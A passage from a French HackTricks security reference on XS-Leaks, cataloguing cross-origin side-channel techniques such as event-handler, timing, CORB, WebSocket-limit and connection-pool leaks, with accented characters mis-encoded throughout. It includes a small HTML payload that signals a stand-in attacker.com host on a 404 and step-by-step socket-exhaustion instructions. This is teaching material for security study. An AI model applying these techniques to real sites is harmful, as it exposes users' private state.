# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Utilisez [****](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) pour construire et **automatiser facilement des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Informations de base

XS-Search est une m√©thode utilis√©e pour **extraire des informations cross-origin** en exploitant des **vuln√©rabilit√©s de canal auxiliaire**.

Les composants cl√©s impliqu√©s dans cette attaque comprennent :

* **Web vuln√©rable** : Le site web cible √† partir duquel les informations doivent √™tre extraites.
* **Web de l'attaquant** : Le site web malveillant cr√©√© par l'attaquant, que la victime visite, h√©bergeant l'exploit.
* **M√©thode d'inclusion** : La technique employ√©e pour incorporer le Web vuln√©rable dans le Web de l'attaquant (par exemple, window.open, iframe, fetch, balise HTML avec href, etc.).
* **Technique de fuite** : Techniques utilis√©es pour discerner les diff√©rences dans l'√©tat du Web vuln√©rable en fonction des informations recueillies par la m√©thode d'inclusion.
* **√âtats** : Les deux conditions potentielles du Web vuln√©rable, que l'attaquant vise √† distinguer.
* **Diff√©rences d√©tectables** : Variations observables sur lesquelles l'attaquant s'appuie pour inf√©rer l'√©tat du Web vuln√©rable.

### Diff√©rences d√©tectables

Plusieurs aspects peuvent √™tre analys√©s pour diff√©rencier les √©tats du Web vuln√©rable :

* **Code d'√©tat** : Distinguer entre **divers codes d'√©tat de r√©ponse HTTP** cross-origin, comme les erreurs serveur, les erreurs client ou les erreurs d'authentification.
* **Utilisation de l'API** : Identifier **l'utilisation des API Web** √† travers les pages, r√©v√©lant si une page cross-origin utilise une API Web JavaScript sp√©cifique.
* **Redirections** : D√©tecter les navigations vers diff√©rentes pages, pas seulement les redirections HTTP mais aussi celles d√©clench√©es par JavaScript ou HTML.
* **Contenu de la page** : Observer **les variations dans le corps de la r√©ponse HTTP** ou dans les sous-ressources de la page, telles que le **nombre de cadres int√©gr√©s** ou les disparit√©s de taille dans les images.
* **En-t√™te HTTP** : Noter la pr√©sence ou √©ventuellement la valeur d'un **en-t√™te de r√©ponse HTTP sp√©cifique**, y compris des en-t√™tes comme X-Frame-Options, Content-Disposition et Cross-Origin-Resource-Policy.
* **Temps** : Remarquer des disparit√©s de temps coh√©rentes entre les deux √©tats.

### M√©thodes d'inclusion

* **√âl√©ments HTML** : HTML offre divers √©l√©ments pour **l'inclusion de ressources cross-origin**, comme des feuilles de style, des images ou des scripts, obligeant le navigateur √† demander une ressource non-HTML. Une compilation des √©l√©ments HTML potentiels √† cet effet peut √™tre trouv√©e sur [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Cadres** : Des √©l√©ments tels que **iframe**, **object** et **embed** peuvent int√©grer des ressources HTML directement dans la page de l'attaquant. Si la page **manque de protection contre le framing**, JavaScript peut acc√©der √† l'objet window de la ressource encadr√©e via la propri√©t√© contentWindow.
* **Pop-ups** : La m√©thode **`window.open`** ouvre une ressource dans un nouvel onglet ou une nouvelle fen√™tre, fournissant un **handle de fen√™tre** pour que JavaScript interagisse avec des m√©thodes et des propri√©t√©s suivant le SOP. Les pop-ups, souvent utilis√©es dans le cadre de l'authentification unique, contournent les restrictions de framing et de cookies d'une ressource cible. Cependant, les navigateurs modernes restreignent la cr√©ation de pop-ups √† certaines actions de l'utilisateur.
* **Requ√™tes JavaScript** : JavaScript permet des requ√™tes directes vers des ressources cibles en utilisant **XMLHttpRequests** ou l'**API Fetch**. Ces m√©thodes offrent un contr√¥le pr√©cis sur la requ√™te, comme choisir de suivre les redirections HTTP.

### Techniques de fuite

* **Gestionnaire d'√©v√©nements** : Une technique de fuite classique dans XS-Leaks, o√π des gestionnaires d'√©v√©nements comme **onload** et **onerror** fournissent des informations sur le succ√®s ou l'√©chec du chargement des ressources.
* **Messages d'erreur** : Les exceptions JavaScript ou les pages d'erreur sp√©ciales peuvent fournir des informations de fuite soit directement √† partir du message d'erreur, soit en diff√©renciant sa pr√©sence et son absence.
* **Limites globales** : Les limitations physiques d'un navigateur, comme la capacit√© m√©moire ou d'autres limites impos√©es par le navigateur, peuvent signaler lorsqu'un seuil est atteint, servant de technique de fuite.
* **√âtat global** : Les interactions d√©tectables avec les **√©tats globaux** des navigateurs (par exemple, l'interface History) peuvent √™tre exploit√©es. Par exemple, le **nombre d'entr√©es** dans l'historique d'un navigateur peut offrir des indices sur les pages cross-origin.
* **API de performance** : Cette API fournit des **d√©tails de performance de la page actuelle**, y compris le timing r√©seau pour le document et les ressources charg√©es, permettant d'inf√©rer sur les ressources demand√©es.
* **Attributs lisibles** : Certains attributs HTML sont **lisibles cross-origin** et peuvent √™tre utilis√©s comme technique de fuite. Par exemple, la propri√©t√© `window.frame.length` permet √† JavaScript de compter les cadres inclus dans une page web cross-origin.

## Outil XSinator & Document

XSinator est un outil automatique pour **v√©rifier les navigateurs contre plusieurs XS-Leaks connus** expliqu√©s dans son document : [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Vous pouvez **acc√©der √† l'outil sur** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks exclus** : Nous avons d√ª exclure les XS-Leaks qui reposent sur des **workers de service** car ils interf√®reraient avec d'autres fuites dans XSinator. De plus, nous avons choisi d'**exclure les XS-Leaks qui reposent sur des erreurs de configuration et des bugs dans une application web sp√©cifique**. Par exemple, les erreurs de configuration CrossOrigin Resource Sharing (CORS), les fuites postMessage ou le Cross-Site Scripting. De plus, nous avons exclu les XS-Leaks bas√©s sur le temps car ils souffrent souvent d'√™tre lents, bruyants et inexactes.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) pour construire et **automatiser facilement des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## **Techniques bas√©es sur le temps**

Certaines des techniques suivantes vont utiliser le temps comme partie du processus pour d√©tecter les diff√©rences dans les √©tats possibles des pages web. Il existe diff√©rentes mani√®res de mesurer le temps dans un navigateur web.

**Horloges** : L'API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permet aux d√©veloppeurs d'obtenir des mesures de temps √† haute r√©solution.\
Il existe un nombre consid√©rable d'APIs que les attaquants peuvent abuser pour cr√©er des horloges implicites : [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animations CSS, et d'autres.\
Pour plus d'infos : [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Techniques de gestionnaire d'√©v√©nements

### Onload/Onerror

* **M√©thodes d'inclusion** : Cadres, √âl√©ments HTML
* **Diff√©rence d√©tectable** : Code d'√©tat
* **Plus d'infos** : [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **R√©sum√©** : si l'on essaie de charger une ressource, les √©v√©nements onerror/onload sont d√©clench√©s lorsque la ressource est charg√©e avec succ√®s/√©chec, il est possible de d√©terminer le code d'√©tat.
* **Exemple de code** : [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

L'exemple de code essaie de **charger des objets de scripts depuis JS**, mais **d'autres balises** telles que des objets, des feuilles de style, des images, des audios pourraient √©galement √™tre utilis√©es. De plus, il est √©galement possible d'injecter la **balise directement** et de d√©clarer les √©v√©nements `onload` et `onerror` √† l'int√©rieur de la balise (au lieu de l'injecter depuis JS).

Il existe √©galement une version sans script de cette attaque :
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In this case if `example.com/404` is not found `attacker.com/?error` will be loaded.

### Onload Timing

* **Inclusion Methods**: √âl√©ments HTML
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** L'[**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** peut √™tre utilis√©e pour mesurer combien de temps il faut pour effectuer une requ√™te. Cependant, d'autres horloges pourraient √™tre utilis√©es, comme l'[**API PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) qui peut identifier les t√¢ches s'ex√©cutant pendant plus de 50 ms.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) un autre exemple dans :

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Cette technique est similaire √† la pr√©c√©dente, mais l'**attaquant** va √©galement **forcer** une action pour prendre un **temps pertinent** lorsque la **r√©ponse est positive ou n√©gative** et mesurer ce temps.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Cadres
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** L'[horloge SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) peut √™tre utilis√©e pour mesurer combien de temps il faut pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Le temps n√©cessaire pour r√©cup√©rer une ressource peut √™tre mesur√© en utilisant les √©v√©nements [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) et [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). L'√©v√©nement **`beforeunload`** est d√©clench√© lorsque le navigateur est sur le point de naviguer vers une nouvelle page, tandis que l'√©v√©nement **`unload`** se produit lorsque la navigation a effectivement lieu. La diff√©rence de temps entre ces deux √©v√©nements peut √™tre calcul√©e pour d√©terminer la **dur√©e que le navigateur a pass√©e √† r√©cup√©rer la ressource**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Cadres
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** L'[performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API peut √™tre utilis√©e pour mesurer combien de temps il faut pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Il a √©t√© observ√© qu'en l'absence de [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), le temps n√©cessaire pour qu'une page et ses sous-ressources se chargent sur le r√©seau peut √™tre mesur√© par un attaquant. Cette mesure est g√©n√©ralement possible car le gestionnaire `onload` d'un iframe est d√©clench√© uniquement apr√®s l'ach√®vement du chargement des ressources et de l'ex√©cution de JavaScript. Pour contourner la variabilit√© introduite par l'ex√©cution de scripts, un attaquant pourrait utiliser l'attribut [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dans le `<iframe>`. L'inclusion de cet attribut restreint de nombreuses fonctionnalit√©s, notamment l'ex√©cution de JavaScript, facilitant ainsi une mesure qui est principalement influenc√©e par la performance du r√©seau.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**:
* **Summary**: Si vous pouvez provoquer une erreur sur la page lorsque le contenu correct est acc√©d√© et la faire charger correctement lorsque n'importe quel contenu est acc√©d√©, alors vous pouvez cr√©er une boucle pour extraire toutes les informations sans mesurer le temps.
* **Code Example**:

Supposons que vous puissiez **ins√©rer** la **page** qui contient le **contenu secret** **dans un Iframe**.

Vous pouvez **faire rechercher √† la victime** le fichier qui contient "_**flag**_" en utilisant un **Iframe** (en exploitant un CSRF par exemple). √Ä l'int√©rieur de l'Iframe, vous savez que l'_**√©v√©nement onload**_ sera **ex√©cut√© toujours au moins une fois**. Ensuite, vous pouvez **changer** l'**URL** de l'**iframe** mais en changeant uniquement le **contenu** du **hash** √† l'int√©rieur de l'URL.

Par exemple :

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la premi√®re URL a √©t√© **charg√©e avec succ√®s**, alors, lorsque vous **changez** la partie **hash** de l'URL, l'**√©v√©nement onload** **ne sera pas d√©clench√©** √† nouveau. Mais **si** la page avait une sorte d'**erreur** lors du **chargement**, alors, l'**√©v√©nement onload** sera **d√©clench√© √† nouveau**.

Ensuite, vous pouvez **distinguer entre** une page **charg√©e correctement** ou une page qui a une **erreur** lorsqu'elle est acc√©d√©e.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**:
* **Summary:** Si la **page** **renvoie** le **contenu sensible**, **ou** un **contenu** qui peut √™tre **contr√¥l√©** par l'utilisateur. L'utilisateur pourrait d√©finir **un code JS valide dans le cas n√©gatif**, un **chargement** √† chaque essai √† l'int√©rieur des **`<script>`** tags, donc dans les cas **n√©gatifs**, le **code** des attaquants est **ex√©cut√©**, et dans les cas **affirmatifs**, **rien** ne sera ex√©cut√©.
* **Code Example:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: √âl√©ments HTML
* **Detectable Difference**: Code d'√©tat & En-t√™tes
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** est une mesure de s√©curit√© qui emp√™che les pages web de charger certaines ressources sensibles d'origine crois√©e pour se prot√©ger contre des attaques comme **Spectre**. Cependant, les attaquants peuvent exploiter son comportement protecteur. Lorsqu'une r√©ponse soumise √† **CORB** renvoie un `Content-Type` _**prot√©g√© par CORB**_ avec `nosniff` et un code d'√©tat `2xx`, **CORB** supprime le corps et les en-t√™tes de la r√©ponse. Les attaquants observant cela peuvent d√©duire la combinaison du **code d'√©tat** (indiquant le succ√®s ou l'erreur) et du `Content-Type` (indiquant s'il est prot√©g√© par **CORB**), ce qui peut entra√Æner une fuite d'informations potentielle.
* **Code Example**:

V√©rifiez le lien d'informations suppl√©mentaires pour plus d'informations sur l'attaque.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Contenu de la page
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Fuite de donn√©es sensibles √† partir de l'attribut id ou name.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Il est possible de **charger une page** √† l'int√©rieur d'un **iframe** et d'utiliser le **`#id_value`** pour faire **focaliser la page sur l'√©l√©ment** de l'iframe avec l'id indiqu√©, puis si un signal **`onblur`** est d√©clench√©, l'√©l√©ment ID existe.\
Vous pouvez effectuer la m√™me attaque avec des tags **`portal`**.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Utilisation de l'API
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Rassembler des informations sensibles √† partir d'un postMessage ou utiliser la pr√©sence de postMessages comme un oracle pour conna√Ætre l'√©tat de l'utilisateur sur la page
* **Code Example**: `Tout code √©coutant tous les postMessages.`

Les applications utilisent fr√©quemment des [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) pour communiquer entre diff√©rentes origines. Cependant, cette m√©thode peut involontairement exposer des **informations sensibles** si le param√®tre `targetOrigin` n'est pas correctement sp√©cifi√©, permettant √† n'importe quelle fen√™tre de recevoir les messages. De plus, le simple fait de recevoir un message peut agir comme un **oracle** ; par exemple, certains messages peuvent n'√™tre envoy√©s qu'aux utilisateurs qui sont connect√©s. Par cons√©quent, la pr√©sence ou l'absence de ces messages peut r√©v√©ler des informations sur l'√©tat ou l'identit√© de l'utilisateur, comme s'il est authentifi√© ou non.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) pour cr√©er et **automatiser facilement des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Techniques de Limites Globales

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Utilisation de l'API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: √âpuiser la limite de connexion WebSocket r√©v√®le le nombre de connexions WebSocket d'une page d'origine crois√©e.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Il est possible d'identifier si, et combien, **de connexions WebSocket une page cible utilise**. Cela permet √† un attaquant de d√©tecter les √©tats de l'application et de r√©v√©ler des informations li√©es au nombre de connexions WebSocket.

Si une **origine** utilise le **nombre maximum d'objets de connexion WebSocket**, ind√©pendamment de l'√©tat de leurs connexions, la cr√©ation de **nouveaux objets entra√Ænera des exceptions JavaScript**. Pour ex√©cuter cette attaque, le site de l'attaquant ouvre le site cible dans une fen√™tre pop-up ou un iframe et ensuite, apr√®s que le site web cible a √©t√© charg√©, tente de cr√©er le maximum possible de connexions WebSocket. Le **nombre d'exceptions lev√©es** est le **nombre de connexions WebSocket utilis√©es par la fen√™tre du site web cible**.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Utilisation de l'API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: D√©tecter la demande de paiement car une seule peut √™tre active √† la fois.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Cette fuite XS permet √† un attaquant de **d√©tecter quand une page d'origine crois√©e initie une demande de paiement**.

Parce que **une seule demande de paiement peut √™tre active** √† la fois, si le site cible utilise l'API de demande de paiement, toute **tentative ult√©rieure d'utiliser cette API √©chouera**, et provoquera une **exception JavaScript**. L'attaquant peut exploiter cela en **tentant p√©riodiquement d'afficher l'interface utilisateur de l'API de paiement**. Si une tentative provoque une exception, le site cible l'utilise actuellement. L'attaquant peut cacher ces tentatives p√©riodiques en fermant imm√©diatement l'interface utilisateur apr√®s sa cr√©ation.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au Contenu de la page, Code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Mesurer le temps d'ex√©cution d'un web en abusant de la boucle d'√©v√©nements JS √† thread unique.
* **Code Example**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript fonctionne sur un mod√®le de concurrence √† [boucle d'√©v√©nements √† thread unique](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), signifiant qu'il **ne peut ex√©cuter qu'une seule t√¢che √† la fois**. Cette caract√©ristique peut √™tre exploit√©e pour √©valuer **combien de temps le code d'une autre origine prend pour s'ex√©cuter**. Un attaquant peut mesurer le temps d'ex√©cution de son propre code dans la boucle d'√©v√©nements en envoyant continuellement des √©v√©nements avec des propri√©t√©s fixes. Ces √©v√©nements seront trait√©s lorsque le pool d'√©v√©nements est vide. Si d'autres origines envoient √©galement des √©v√©nements au m√™me pool, un **attaquant peut d√©duire le temps qu'il faut pour que ces √©v√©nements externes s'ex√©cutent en observant les retards dans l'ex√©cution de ses propres t√¢ches**. Cette m√©thode de surveillance de la boucle d'√©v√©nements pour des retards peut r√©v√©ler le temps d'ex√©cution du code provenant de diff√©rentes origines, exposant potentiellement des informations sensibles.

{% hint style="warning" %}
Dans un timing d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au Contenu de la page, Code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Une m√©thode pour mesurer le temps d'ex√©cution d'une op√©ration web consiste √† bloquer intentionnellement la boucle d'√©v√©nements d'un thread et ensuite √† chronom√©trer **combien de temps il faut pour que la boucle d'√©v√©nements soit √† nouveau disponible**. En ins√©rant une op√©ration de blocage (comme un long calcul ou un appel d'API synchrone) dans la boucle d'√©v√©nements, et en surveillant le temps qu'il faut pour que le code suivant commence √† s'ex√©cuter, on peut d√©duire la dur√©e des t√¢ches qui s'ex√©cutaient dans la boucle d'√©v√©nements pendant la p√©riode de blocage. Cette technique exploite la nature √† thread unique de la boucle d'√©v√©nements de JavaScript, o√π les t√¢ches sont ex√©cut√©es s√©quentiellement, et peut fournir des informations sur la performance ou le comportement d'autres op√©rations partageant le m√™me thread.
* **Code Example**:

Un avantage significatif de la technique de mesure du temps d'ex√©cution en verrouillant la boucle d'√©v√©nements est son potentiel √† contourner **l'Isolation de Site**. **L'Isolation de Site** est une fonctionnalit√© de s√©curit√© qui s√©pare diff√©rents sites web en processus distincts, visant √† emp√™cher les sites malveillants d'acc√©der directement aux donn√©es sensibles d'autres sites. Cependant, en influen√ßant le timing d'ex√©cution d'une autre origine par le biais de la boucle d'√©v√©nements partag√©e, un attaquant peut indirectement extraire des informations sur les activit√©s de cette origine. Cette m√©thode ne repose pas sur un acc√®s direct aux donn√©es de l'autre origine mais plut√¥t sur l'observation de l'impact des activit√©s de cette origine sur la boucle d'√©v√©nements partag√©e, contournant ainsi les barri√®res de protection √©tablies par **l'Isolation de Site**.

{% hint style="warning" %}
Dans un timing d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: Requ√™tes JavaScript
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au Contenu de la page, Code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Un attaquant pourrait verrouiller toutes les sockets sauf 1, charger le web cible et en m√™me temps charger une autre page, le temps jusqu'√† ce que la derni√®re page commence √† se charger est le temps que la page cible a mis √† charger.
* **Code Example**:

{% content-ref url="connection-pool-example.md" %}
[connection-pool-example.md](connection-pool-example.md)
{% endcontent-ref %}

Les navigateurs utilisent des sockets pour la communication avec le serveur, mais en raison des ressources limit√©es du syst√®me d'exploitation et du mat√©riel, **les navigateurs sont contraints d'imposer une limite** au nombre de sockets simultan√©s. Les attaquants peuvent exploiter cette limitation par les √©tapes suivantes :

1. D√©terminer la limite de sockets du navigateur, par exemple, 256 sockets globales.
2. Occuper 255 sockets pendant une dur√©e prolong√©e en initiant 255 requ√™tes √† divers h√¥tes, con√ßues pour maintenir les connexions ouvertes sans les terminer.
3. Utiliser la 256√®me socket pour envoyer une requ√™te √† la page cible.
4. Tenter une 257√®me requ√™te √† un autre h√¥te. √âtant donn√© que toutes les sockets sont utilis√©es (comme indiqu√© aux √©tapes 2 et 3), cette requ√™te sera mise en file d'attente jusqu'√† ce qu'une socket devienne disponible. Le d√©lai avant que cette requ√™te ne progresse fournit √† l'attaquant des informations de timing sur l'activit√© r√©seau li√©e √† la socket de la 256√®me (la socket de la page cible). Cette inf√©rence est possible car les 255 sockets de l'√©tape 2 sont toujours engag√©es, ce qui implique que toute nouvelle socket disponible doit √™tre celle lib√©r√©e de l'√©tape 3. Le temps n√©cessaire pour que la 256√®me socket devienne disponible est donc directement li√© au temps requis pour que la requ√™te √† la page cible se termine.

Pour plus d'infos : [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: Requ√™tes JavaScript
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au Contenu de la page, Code d'√©tat)
* **More info**:
* **Summary:** C'est comme la technique pr√©c√©dente mais au lieu d'utiliser toutes les sockets, Google **Chrome** impose une limite de **6 requ√™tes simultan√©es √† la m√™me origine**. Si nous **bloquons 5** et ensuite **lancions une 6√®me** requ√™te, nous pouvons **la chronom√©trer** et si nous avons r√©ussi √† faire en sorte que la **page victime envoie** plus de **requ√™tes** au m√™me point de terminaison pour d√©tecter un **statut** de la **page**, la **6√®me requ√™te** prendra **plus de temps** et nous pourrons le d√©tecter.

## Techniques de l'API de Performance

L'[`API de Performance`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) offre des informations sur les m√©triques de performance des applications web, enrichies par l'[`API de Timing des Ressources`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). L'API de Timing des Ressources permet de surveiller les temps de requ√™tes r√©seau d√©taill√©s, tels que la dur√©e des requ√™tes. Notamment, lorsque les serveurs incluent l'en-t√™te `Timing-Allow-Origin: *` dans leurs r√©ponses, des donn√©es suppl√©mentaires comme la taille de transfert et le temps de recherche de domaine deviennent disponibles.

